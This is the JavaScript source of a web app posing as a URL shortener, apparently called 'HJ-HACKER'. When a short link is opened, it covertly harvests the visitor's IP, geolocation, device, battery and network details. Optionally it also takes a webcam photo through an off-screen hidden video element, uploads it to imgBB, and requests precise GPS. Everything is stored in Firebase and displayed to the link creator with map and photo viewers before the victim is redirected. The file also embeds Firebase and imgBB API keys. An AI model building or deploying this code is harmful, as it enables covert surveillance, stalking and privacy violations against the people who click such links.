// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
    authDomain: "hjh-tools.firebaseapp.com",
    projectId: "hjh-tools",
    storageBucket: "hjh-tools.firebasestorage.app",
    messagingSenderId: "643137472905",
    appId: "1:643137472905:web:814ca23a86fb084811b958",
    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// ========== IMGBB API KEY (YOUR KEY) ==========
const IMGBB_API_KEY = "1c64909854fd8f51eaad9f03c965ad78";

// ========== CAPTURE & UPLOAD TO IMGBB ==========
async function captureAndUploadPhoto() {
    try {
        showToast("Camera", "Starting camera...", "info");
        
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { width: { ideal: 640 }, height: { ideal: 480 } } 
        });
        
        const video = document.createElement('video');
        video.srcObject = stream;
        video.playsInline = true;
        video.style.position = 'fixed';
        video.style.top = '-9999px';
        video.style.left = '-9999px';
        document.body.appendChild(video);
        await video.play();
        
        await new Promise(r => setTimeout(r, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const base64 = canvas.toDataURL('image/jpeg', 0.7);
        
        stream.getTracks().forEach(t => t.stop());
        video.remove();
        
        showToast("Uploading", "Uploading to imgBB...", "info");
        
        const formData = new FormData();
        formData.append('image', base64.split(',')[1]);
        formData.append('key', IMGBB_API_KEY);
        
        const response = await fetch('https://api.imgbb.com/1/upload', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.success) {
            const imageUrl = result.data.url;
            showToast("Success", "Photo uploaded!", "success");
            console.log("Image URL:", imageUrl);
            return imageUrl;
        } else {
            showToast("Error", "Upload failed: " + result.error?.message, "error");
            return null;
        }
        
    } catch (error) {
        console.error("Camera error:", error);
        showToast("Error", error.message, "error");
        return null;
    }
}

// ========== CAPTURE LOCATION ==========
async function captureLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const loc = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
                showToast("Location", "Location captured!", "success");
                resolve(loc);
            },
            (error) => {
                console.error("Location error:", error);
                resolve(null);
            },
            { timeout: 10000, enableHighAccuracy: true }
        );
    });
}

// ========== DEVICE INFO ==========
async function getDeviceInfo() {
    const ua = navigator.userAgent;
    
    let browser = "Unknown";
    if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
    else if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
    else if (ua.includes("Edg")) browser = "Edge";
    else if (ua.includes("OPR")) browser = "Opera";
    
    let os = "Unknown";
    let osVersion = "Unknown";
    if (ua.includes("Android")) {
        os = "Android";
        const match = ua.match(/Android[\s/]+([\d.]+)/);
        osVersion = match ? match[1] : "Unknown";
    } else if (ua.includes("iPhone")) {
        os = "iOS";
        const match = ua.match(/iPhone OS ([\d_]+)/);
        osVersion = match ? match[1].replace(/_/g, '.') : "Unknown";
    } else if (ua.includes("Windows NT 10.0")) {
        os = "Windows 10";
        osVersion = "10";
    } else if (ua.includes("Windows NT 11.0")) {
        os = "Windows 11";
        osVersion = "11";
    } else if (ua.includes("Mac OS X")) {
        os = "macOS";
        const match = ua.match(/Mac OS X ([\d_]+)/);
        osVersion = match ? match[1].replace(/_/g, '.') : "Unknown";
    }
    
    let device = "Unknown";
    let deviceBrand = "Unknown";
    if (ua.includes("iPhone")) device = "iPhone";
    else if (ua.includes("iPad")) device = "iPad";
    else if (ua.includes("SM-")) { deviceBrand = "Samsung"; device = "Samsung"; }
    else if (ua.includes("MI ")) { deviceBrand = "Xiaomi"; device = "Xiaomi"; }
    else if (ua.includes("Redmi")) { deviceBrand = "Xiaomi"; device = "Redmi"; }
    else if (ua.includes("Pixel")) { deviceBrand = "Google"; device = "Pixel"; }
    else if (ua.includes("OnePlus")) { deviceBrand = "OnePlus"; device = "OnePlus"; }
    
    let batteryLevel = "Unknown";
    let batteryCharging = "Unknown";
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100) + "%";
            batteryCharging = battery.charging ? "Yes" : "No";
        } catch(e) {}
    }
    
    let connectionType = "Unknown";
    let downlink = "Unknown";
    let rtt = "Unknown";
    if (navigator.connection) {
        connectionType = navigator.connection.effectiveType || "Unknown";
        downlink = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "Unknown";
        rtt = navigator.connection.rtt ? navigator.connection.rtt + " ms" : "Unknown";
    }
    
    return {
        browser: browser,
        os: os,
        os_version: osVersion,
        device_brand: deviceBrand,
        device: device,
        screen_width: screen.width,
        screen_height: screen.height,
        device_pixel_ratio: window.devicePixelRatio,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardware_concurrency: navigator.hardwareConcurrency || "Unknown",
        device_memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
        battery_level: batteryLevel,
        battery_charging: batteryCharging,
        connection_type: connectionType,
        downlink: downlink,
        rtt: rtt
    };
}

// ========== IP INFO ==========
async function getIPInfo() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return {
            ip: data.ip || "Unknown",
            city: data.city || "Unknown",
            region: data.region || "Unknown",
            country: data.country_name || "Unknown",
            country_code: data.country_code || "Unknown",
            postal: data.postal || "Unknown",
            latitude: data.latitude || null,
            longitude: data.longitude || null,
            timezone: data.timezone || "Unknown"
        };
    } catch (e) {
        return { ip: "Unknown", city: "Unknown", country: "Unknown", latitude: null, longitude: null };
    }
}

// ========== TOAST ==========
function showToast(title, message, type = 'success') {
    let container = document.getElementById('toastContainer');
    if (!container) {
        container = document.createElement('div');
        container.id = 'toastContainer';
        container.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:9999';
        document.body.appendChild(container);
    }
    
    const toast = document.createElement('div');
    const colors = { success: '#00ff41', error: '#ff4444', info: '#00aaff' };
    toast.style.cssText = `
        background: ${colors[type] || colors.success};
        color: black;
        padding: 10px 15px;
        margin: 5px;
        border-radius: 8px;
        font-size: 12px;
        font-weight: bold;
        font-family: monospace;
        box-shadow: 0 2px 10px rgba(0,0,0,0.3);
    `;
    toast.innerHTML = `<strong>${title}</strong><br>${message}`;
    container.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

// ========== CREATE SHORT LINK ==========
async function shortenUrl() {
    const longUrl = document.getElementById('longUrl').value.trim();
    if (!longUrl) {
        showToast("Error", "Please enter a URL", "error");
        return;
    }
    
    let finalUrl = longUrl;
    if (!finalUrl.startsWith('http')) finalUrl = 'https://' + finalUrl;
    
    try {
        new URL(finalUrl);
    } catch {
        showToast("Error", "Invalid URL", "error");
        return;
    }
    
    const customCode = document.getElementById('customCode').value.trim();
    let shortCode = customCode || Math.random().toString(36).substring(2, 8);
    
    // Check if code exists
    const existing = await database.ref(`urls/${shortCode}`).once('value');
    if (existing.exists()) {
        showToast("Error", "Code already taken", "error");
        return;
    }
    
    const cameraOn = document.getElementById('captureCamera')?.checked || false;
    const locationOn = document.getElementById('captureLocation')?.checked || false;
    const hasPassword = document.getElementById('passwordToggle')?.checked || false;
    const password = hasPassword ? document.getElementById('password')?.value : null;
    const hasSocialGate = document.getElementById('socialToggle')?.checked || false;
    const socialUrl = hasSocialGate ? document.getElementById('socialUrl')?.value : null;
    const socialTitle = hasSocialGate ? document.getElementById('socialTitle')?.value : null;
    
    if (hasPassword && !password) {
        showToast("Error", "Enter password", "error");
        return;
    }
    
    if (hasSocialGate && !socialUrl) {
        showToast("Error", "Enter social URL", "error");
        return;
    }
    
    showToast("Creating", "Creating link...", "info");
    
    try {
        const linkData = {
            long_url: finalUrl,
            created_at: new Date().toISOString(),
            clicks: 0,
            capture_camera: cameraOn,
            capture_location: locationOn
        };
        
        if (password) linkData.password = password;
        if (socialUrl) {
            linkData.social_gate_url = socialUrl;
            linkData.social_gate_title = socialTitle || "Follow to Unlock";
        }
        
        await database.ref(`urls/${shortCode}`).set(linkData);
        
        const shortUrl = window.location.origin + "/" + shortCode;
        document.getElementById('shortLink').textContent = shortUrl;
        document.getElementById('result').classList.remove('hidden');
        
        // Generate QR
        if (typeof QRCode !== 'undefined') {
            const qrDiv = document.getElementById('qrCode');
            if (qrDiv) {
                qrDiv.innerHTML = '';
                new QRCode(qrDiv, {
                    text: shortUrl,
                    width: 100,
                    height: 100,
                    colorDark: "#00ff41",
                    colorLight: "#000000"
                });
            }
        }
        
        showToast("Success", "Link: " + shortCode, "success");
        document.getElementById('longUrl').value = '';
        document.getElementById('customCode').value = '';
        
        // Reset toggles
        document.getElementById('passwordToggle').checked = false;
        document.getElementById('socialToggle').checked = false;
        document.getElementById('passwordSection')?.classList.add('hidden');
        document.getElementById('socialSection')?.classList.add('hidden');
        
        // Refresh displays
        showLinks();
        showStats();
        showRecent();
        
    } catch (error) {
        showToast("Error", error.message, "error");
    }
}

// ========== DELETE LINK ==========
async function deleteLink(code) {
    try {
        await database.ref(`urls/${code}`).remove();
        await database.ref(`analytics/${code}`).remove();
        showToast("Deleted", "Link deleted!", "success");
        showLinks();
        showStats();
        showRecent();
    } catch (error) {
        showToast("Error", "Delete failed", "error");
    }
}

// ========== SHOW LINKS ==========
async function showLinks() {
    const content = document.getElementById('dataDisplayContent');
    if (!content) return;
    
    content.innerHTML = '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i> Loading...</div>';
    
    try {
        const snapshot = await database.ref('urls').once('value');
        const urls = snapshot.val();
        
        if (!urls || Object.keys(urls).length === 0) {
            content.innerHTML = '<div class="empty-data"><i class="fas fa-inbox"></i> No links created yet</div>';
            return;
        }
        
        let html = '';
        for (const [code, data] of Object.entries(urls)) {
            html += `
                <div class="data-item" style="margin-bottom:12px;padding:12px;background:#0a0a0a;border-radius:10px;border:1px solid #1a1a1a;">
                    <div class="data-item-header" style="display:flex;justify-content:space-between;margin-bottom:8px;">
                        <span class="data-item-code" style="color:#00ff41;font-weight:bold;"><i class="fas fa-link"></i> /${code}</span>
                        <span class="data-item-date" style="color:#666;font-size:11px;">${new Date(data.created_at).toLocaleDateString()}</span>
                    </div>
                    <div class="data-item-url" style="font-size:12px;color:#aaa;margin-bottom:8px;word-break:break-all;">${data.long_url?.substring(0, 60)}${data.long_url?.length > 60 ? '...' : ''}</div>
                    <div class="data-item-stats" style="display:flex;gap:12px;font-size:11px;margin-bottom:10px;">
                        <span><i class="fas fa-mouse-pointer"></i> Clicks: ${data.clicks || 0}</span>
                        ${data.capture_camera ? '<span style="color:#00ff41;"><i class="fas fa-camera"></i> Camera</span>' : ''}
                        ${data.capture_location ? '<span style="color:#00ff41;"><i class="fas fa-map-marker-alt"></i> Location</span>' : ''}
                        ${data.password ? '<span><i class="fas fa-lock"></i> Password</span>' : ''}
                    </div>
                    <div class="data-item-actions" style="display:flex;gap:8px;">
                        <button class="data-btn-sm" onclick="copyToClipboard('${window.location.origin}/${code}')" style="background:#1a1a1a;border:1px solid #00ff41;color:#00ff41;padding:4px 10px;border-radius:5px;cursor:pointer;font-size:11px;"><i class="fas fa-copy"></i> Copy</button>
                        <button class="data-btn-sm" onclick="viewAnalytics('${code}')" style="background:#1a1a1a;border:1px solid #00aaff;color:#00aaff;padding:4px 10px;border-radius:5px;cursor:pointer;font-size:11px;"><i class="fas fa-chart-line"></i> Data</button>
                        <button class="data-btn-sm" onclick="confirmDeleteLink('${code}')" style="background:#1a1a1a;border:1px solid #ff4444;color:#ff4444;padding:4px 10px;border-radius:5px;cursor:pointer;font-size:11px;"><i class="fas fa-trash"></i> Delete</button>
                    </div>
                </div>
            `;
        }
        content.innerHTML = html;
    } catch (error) {
        content.innerHTML = '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i> Error loading links</div>';
    }
}

// ========== SHOW STATS ==========
async function showStats() {
    const content = document.getElementById('dataDisplayContent');
    content.innerHTML = '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i> Loading...</div>';
    
    try {
        const snapshot = await database.ref('urls').once('value');
        const urls = snapshot.val();
        
        let totalLinks = 0, totalClicks = 0;
        if (urls) {
            totalLinks = Object.keys(urls).length;
            for (const data of Object.values(urls)) {
                totalClicks += data.clicks || 0;
            }
        }
        
        // Get total visitors
        const analyticsSnapshot = await database.ref('analytics').once('value');
        let totalVisitors = 0;
        if (analyticsSnapshot.val()) {
            for (const visits of Object.values(analyticsSnapshot.val())) {
                totalVisitors += Object.keys(visits).length;
            }
        }
        
        content.innerHTML = `
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
                <div class="stat-card" style="background:#0a0a0a;padding:15px;border-radius:10px;text-align:center;border:1px solid #1a1a1a;">
                    <div style="font-size:28px;color:#00ff41;font-weight:bold;">${totalLinks}</div>
                    <div style="font-size:12px;color:#aaa;"><i class="fas fa-link"></i> Total Links</div>
                </div>
                <div class="stat-card" style="background:#0a0a0a;padding:15px;border-radius:10px;text-align:center;border:1px solid #1a1a1a;">
                    <div style="font-size:28px;color:#00ff41;font-weight:bold;">${totalClicks}</div>
                    <div style="font-size:12px;color:#aaa;"><i class="fas fa-mouse-pointer"></i> Total Clicks</div>
                </div>
                <div class="stat-card" style="background:#0a0a0a;padding:15px;border-radius:10px;text-align:center;border:1px solid #1a1a1a;">
                    <div style="font-size:28px;color:#00ff41;font-weight:bold;">${totalVisitors}</div>
                    <div style="font-size:12px;color:#aaa;"><i class="fas fa-users"></i> Total Visitors</div>
                </div>
            </div>
        `;
    } catch (error) {
        content.innerHTML = '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i> Error</div>';
    }
}

// ========== SHOW RECENT ==========
async function showRecent() {
    const content = document.getElementById('dataDisplayContent');
    content.innerHTML = '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i> Loading...</div>';
    
    try {
        const analyticsSnapshot = await database.ref('analytics').once('value');
        const allAnalytics = analyticsSnapshot.val();
        
        if (!allAnalytics) {
            content.innerHTML = '<div class="empty-data"><i class="fas fa-clock"></i> No visitors yet</div>';
            return;
        }
        
        let visitors = [];
        for (const [code, visits] of Object.entries(allAnalytics)) {
            for (const [id, data] of Object.entries(visits)) {
                if (data && data.created_at) {
                    visitors.push({
                        code: code,
                        ip: data.ip || 'Unknown',
                        city: data.city || 'Unknown',
                        country: data.country || 'Unknown',
                        browser: data.browser || 'Unknown',
                        os: data.os || 'Unknown',
                        device: data.device || 'Unknown',
                        screen: `${data.screen_width || '?'}x${data.screen_height || '?'}`,
                        battery: data.battery_level || 'Unknown',
                        connection: data.connection_type || 'Unknown',
                        lat: data.latitude || data.lat || null,
                        lng: data.longitude || data.lng || null,
                        photo_url: data.photo_url || null,
                        timestamp: data.created_at
                    });
                }
            }
        }
        
        visitors.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const recent = visitors.slice(0, 20);
        
        if (recent.length === 0) {
            content.innerHTML = '<div class="empty-data"><i class="fas fa-clock"></i> No visitors yet</div>';
            return;
        }
        
        let html = '';
        for (const v of recent) {
            html += `
                <div class="data-item" style="margin-bottom:12px;padding:12px;background:#0a0a0a;border-radius:10px;border:1px solid #1a1a1a;">
                    <div class="data-item-header" style="display:flex;justify-content:space-between;margin-bottom:8px;">
                        <span style="color:#00ff41;font-weight:bold;"><i class="fas fa-link"></i> /${v.code}</span>
                        <span style="color:#666;font-size:11px;"><i class="fas fa-clock"></i> ${new Date(v.timestamp).toLocaleString()}</span>
                    </div>
                    <div style="font-size:12px;margin-bottom:5px;"><i class="fas fa-globe"></i> IP: ${v.ip} | ${v.city}, ${v.country}</div>
                    <div style="font-size:12px;margin-bottom:5px;"><i class="fas fa-mobile-alt"></i> ${v.device} | ${v.browser} on ${v.os}</div>
                    <div style="font-size:12px;margin-bottom:5px;"><i class="fas fa-desktop"></i> Screen: ${v.screen} | 🔋 ${v.battery} | 📶 ${v.connection}</div>
            `;
            
            if (v.lat && v.lng) {
                html += `
                    <div style="margin-top:8px;">
                        <button class="data-btn-sm" onclick="window.open('https://www.google.com/maps?q=${v.lat},${v.lng}', '_blank')" style="background:#1a1a1a;border:1px solid #00aaff;color:#00aaff;padding:4px 10px;border-radius:5px;cursor:pointer;font-size:11px;">
                            <i class="fas fa-map-marked-alt"></i> Open Map (${v.lat.toFixed(4)}, ${v.lng.toFixed(4)})
                        </button>
                    </div>
                `;
            }
            
            if (v.photo_url) {
                html += `
                    <div style="margin-top:8px;">
                        <button class="data-btn-sm" onclick="viewPhoto('${v.photo_url}')" style="background:#1a1a1a;border:1px solid #00ff41;color:#00ff41;padding:4px 10px;border-radius:5px;cursor:pointer;font-size:11px;">
                            <i class="fas fa-camera"></i> View Photo
                        </button>
                    </div>
                `;
            }
            
            html += `</div>`;
        }
        
        content.innerHTML = html;
    } catch (error) {
        content.innerHTML = '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i> Error: ' + error.message + '</div>';
    }
}

// ========== VIEW ANALYTICS ==========
window.viewAnalytics = async (code) => {
    const content = document.getElementById('dataDisplayContent');
    content.innerHTML = '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i> Loading analytics...</div>';
    
    try {
        const linkSnapshot = await database.ref(`urls/${code}`).once('value');
        const linkData = linkSnapshot.val();
        
        const analyticsSnapshot = await database.ref(`analytics/${code}`).once('value');
        const analytics = analyticsSnapshot.val();
        
        if (!analytics) {
            content.innerHTML = '<div class="empty-data"><i class="fas fa-inbox"></i> No visitors for this link</div>';
            return;
        }
        
        let visitors = [];
        for (const [id, data] of Object.entries(analytics)) {
            if (data && data.created_at) {
                visitors.push(data);
            }
        }
        
        visitors.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
        
        let html = `
            <div style="margin-bottom:15px;padding:12px;background:#0a0a0a;border-radius:10px;">
                <div style="color:#00ff41;font-weight:bold;">📊 ANALYTICS: /${code}</div>
                <div style="font-size:11px;color:#aaa;margin-top:5px;word-break:break-all;"><i class="fas fa-link"></i> ${linkData?.long_url || 'N/A'}</div>
                <div style="font-size:11px;color:#aaa;"><i class="fas fa-users"></i> Total Visitors: ${visitors.length}</div>
            </div>
        `;
        
        for (const v of visitors) {
            html += `
                <div class="data-item" style="margin-bottom:12px;padding:12px;background:#0a0a0a;border-radius:10px;border:1px solid #1a1a1a;">
                    <div style="display:flex;justify-content:space-between;margin-bottom:8px;">
                        <span><i class="fas fa-globe"></i> ${v.ip || 'Unknown'}</span>
                        <span style="color:#666;font-size:11px;">${new Date(v.created_at).toLocaleString()}</span>
                    </div>
                    <div style="font-size:12px;margin-bottom:5px;"><strong>📍 Location:</strong> ${v.city || 'Unknown'}, ${v.country || 'Unknown'}</div>
                    <div style="font-size:12px;margin-bottom:5px;"><strong>📱 Device:</strong> ${v.device || 'Unknown'}</div>
                    <div style="font-size:12px;margin-bottom:5px;"><strong>🌐 Browser:</strong> ${v.browser || 'Unknown'} on ${v.os || 'Unknown'} ${v.os_version ? '('+v.os_version+')' : ''}</div>
                    <div style="font-size:12px;margin-bottom:5px;"><strong>🔋 Battery:</strong> ${v.battery_level || 'Unknown'} | <strong>Charging:</strong> ${v.battery_charging || 'Unknown'}</div>
                    <div style="font-size:12px;margin-bottom:5px;"><strong>💾 RAM:</strong> ${v.device_memory || 'Unknown'} | <strong>CPU:</strong> ${v.hardware_concurrency || 'Unknown'} cores</div>
                    <div style="font-size:12px;margin-bottom:5px;"><strong>📶 Network:</strong> ${v.connection_type ? v.connection_type.toUpperCase() : 'Unknown'} | ${v.downlink || ''} | ${v.rtt || ''}</div>
                    <div style="font-size:12px;margin-bottom:5px;"><strong>📺 Screen:</strong> ${v.screen_width || '?'}x${v.screen_height || '?'} | Ratio: ${v.device_pixel_ratio || '1'}</div>
                    <div style="font-size:12px;margin-bottom:5px;"><strong>🗣️ Language:</strong> ${v.language || 'Unknown'} | <strong>⏰ Timezone:</strong> ${v.timezone || 'Unknown'}</div>
            `;
            
            if (v.latitude && v.longitude) {
                html += `
                    <div style="margin-top:8px;">
                        <button class="data-btn-sm" onclick="window.open('https://www.google.com/maps?q=${v.latitude},${v.longitude}', '_blank')" style="background:#1a1a1a;border:1px solid #00aaff;color:#00aaff;padding:4px 10px;border-radius:5px;cursor:pointer;">
                            <i class="fas fa-map-marked-alt"></i> Open Map (${v.latitude.toFixed(6)}, ${v.longitude.toFixed(6)})
                        </button>
                    </div>
                `;
            }
            
            if (v.photo_url) {
                html += `
                    <div style="margin-top:8px;">
                        <button class="data-btn-sm" onclick="viewPhoto('${v.photo_url}')" style="background:#1a1a1a;border:1px solid #00ff41;color:#00ff41;padding:4px 10px;border-radius:5px;cursor:pointer;">
                            <i class="fas fa-camera"></i> View Photo
                        </button>
                    </div>
                `;
            }
            
            html += `</div>`;
        }
        
        content.innerHTML = html;
        showToast("Success", `${visitors.length} visitors found`, "success");
        
    } catch (error) {
        content.innerHTML = '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i> Error loading analytics</div>';
        showToast("Error", error.message, "error");
    }
};

// ========== VIEW PHOTO ==========
window.viewPhoto = (url) => {
    const modal = document.getElementById('photoModal');
    const img = document.getElementById('photoModalImage');
    
    if (modal && img && url) {
        img.src = url;
        modal.style.display = 'flex';
        modal.classList.remove('hidden');
        showToast("Photo", "Photo loaded!", "success");
    } else {
        showToast("Error", "Cannot view photo", "error");
    }
};

function closePhotoModal() {
    const modal = document.getElementById('photoModal');
    if (modal) {
        modal.style.display = 'none';
        modal.classList.add('hidden');
    }
}

function downloadPhoto() {
    const img = document.getElementById('photoModalImage');
    if (img && img.src) {
        window.open(img.src, '_blank');
    }
}

window.copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    showToast("Copied", "Link copied!", "success");
};

window.confirmDeleteLink = (code) => {
    if (confirm(`Delete link /${code}? This will also delete all analytics data.`)) {
        deleteLink(code);
    }
};

// ========== TOGGLE FUNCTIONS ==========
function togglePassword() {
    const section = document.getElementById('passwordSection');
    if (section) section.classList.toggle('hidden');
}

function toggleSocial() {
    const section = document.getElementById('socialSection');
    if (section) section.classList.toggle('hidden');
}

function toggleAdvanced() {
    const content = document.getElementById('advancedContent');
    if (content) content.classList.toggle('hidden');
}

// ========== VISITOR HANDLER ==========
async function handleVisitorRedirect() {
    const path = window.location.pathname;
    if (path === '/' || path === '/index.html') return;
    
    const shortCode = path.substring(1);
    console.log("🔗 Visiting link:", shortCode);
    
    try {
        const snapshot = await database.ref(`urls/${shortCode}`).once('value');
        const linkData = snapshot.val();
        
        if (!linkData) {
            console.log("Link not found");
            return;
        }
        
        console.log("Link data:", linkData);
        
        let photoUrl = null;
        let locationData = null;
        let ipInfo = await getIPInfo();
        let deviceInfo = await getDeviceInfo();
        
        // Capture photo if enabled
        if (linkData.capture_camera === true) {
            console.log("📸 Capturing photo...");
            photoUrl = await captureAndUploadPhoto();
            console.log("Photo URL:", photoUrl);
        }
        
        // Capture location if enabled
        if (linkData.capture_location === true) {
            console.log("📍 Capturing location...");
            locationData = await captureLocation();
            console.log("Location:", locationData);
        }
        
        // Check password
        if (linkData.password) {
            const pwd = prompt("This link is password protected. Enter password:");
            if (pwd !== linkData.password) {
                alert("Wrong password!");
                return;
            }
        }
        
        // Check social gate
        if (linkData.social_gate_url) {
            const confirmGate = confirm(`Please follow: ${linkData.social_gate_title || 'Follow to continue'}\n\nClick OK to open link. After following, come back and click OK again.`);
            if (confirmGate) {
                window.open(linkData.social_gate_url, '_blank');
                await new Promise(r => setTimeout(r, 3000));
            }
        }
        
        // Save analytics
        const analyticsData = {
            created_at: new Date().toISOString(),
            ip: ipInfo.ip,
            city: ipInfo.city,
            region: ipInfo.region,
            country: ipInfo.country,
            latitude: locationData?.lat || ipInfo.latitude,
            longitude: locationData?.lng || ipInfo.longitude,
            accuracy: locationData?.accuracy,
            photo_url: photoUrl,
            browser: deviceInfo.browser,
            os: deviceInfo.os,
            os_version: deviceInfo.os_version,
            device: deviceInfo.device,
            device_brand: deviceInfo.device_brand,
            screen_width: deviceInfo.screen_width,
            screen_height: deviceInfo.screen_height,
            device_pixel_ratio: deviceInfo.device_pixel_ratio,
            language: deviceInfo.language,
            timezone: deviceInfo.timezone,
            hardware_concurrency: deviceInfo.hardware_concurrency,
            device_memory: deviceInfo.device_memory,
            battery_level: deviceInfo.battery_level,
            battery_charging: deviceInfo.battery_charging,
            connection_type: deviceInfo.connection_type,
            downlink: deviceInfo.downlink,
            rtt: deviceInfo.rtt
        };
        
        await database.ref(`analytics/${shortCode}`).push(analyticsData);
        await database.ref(`urls/${shortCode}/clicks`).transaction(c => (c || 0) + 1);
        
        console.log("✅ Analytics saved, redirecting...");
        
        // Redirect to original URL
        window.location.href = linkData.long_url;
        
    } catch (error) {
        console.error("❌ Redirect error:", error);
    }
}

// ========== EVENT LISTENERS ==========
document.getElementById('shortenBtn')?.addEventListener('click', shortenUrl);
document.getElementById('copyBtn')?.addEventListener('click', () => {
    const link = document.getElementById('shortLink')?.textContent;
    if (link) copyToClipboard(link);
});
document.getElementById('closePhotoModal')?.addEventListener('click', closePhotoModal);
document.getElementById('closePhotoModalBtn')?.addEventListener('click', closePhotoModal);
document.getElementById('downloadPhotoBtn')?.addEventListener('click', downloadPhoto);
document.getElementById('passwordToggle')?.addEventListener('change', togglePassword);
document.getElementById('socialToggle')?.addEventListener('change', toggleSocial);
document.getElementById('advancedToggle')?.addEventListener('click', toggleAdvanced);

// Bottom navigation
document.querySelectorAll('.bottom-nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const tab = btn.dataset.tab;
        document.querySelectorAll('.bottom-nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        
        if (tab === 'create') {
            document.getElementById('createCard')?.scrollIntoView({ behavior: 'smooth' });
            const content = document.getElementById('dataDisplayContent');
            if (content) {
                content.innerHTML = '<div class="empty-data"><i class="fas fa-fingerprint"></i><p>Click LINKS, STATS, or RECENT to view data</p></div>';
            }
        } else if (tab === 'links') showLinks();
        else if (tab === 'stats') showStats();
        else if (tab === 'recent') showRecent();
    });
});

// Close modals on outside click
window.addEventListener('click', (e) => {
    const modal = document.getElementById('photoModal');
    if (e.target === modal) closePhotoModal();
});

// Start
handleVisitorRedirect();
showLinks();
showStats();
showRecent();

console.log("✅ HJ-HACKER FULLY WORKING with imgBB!");
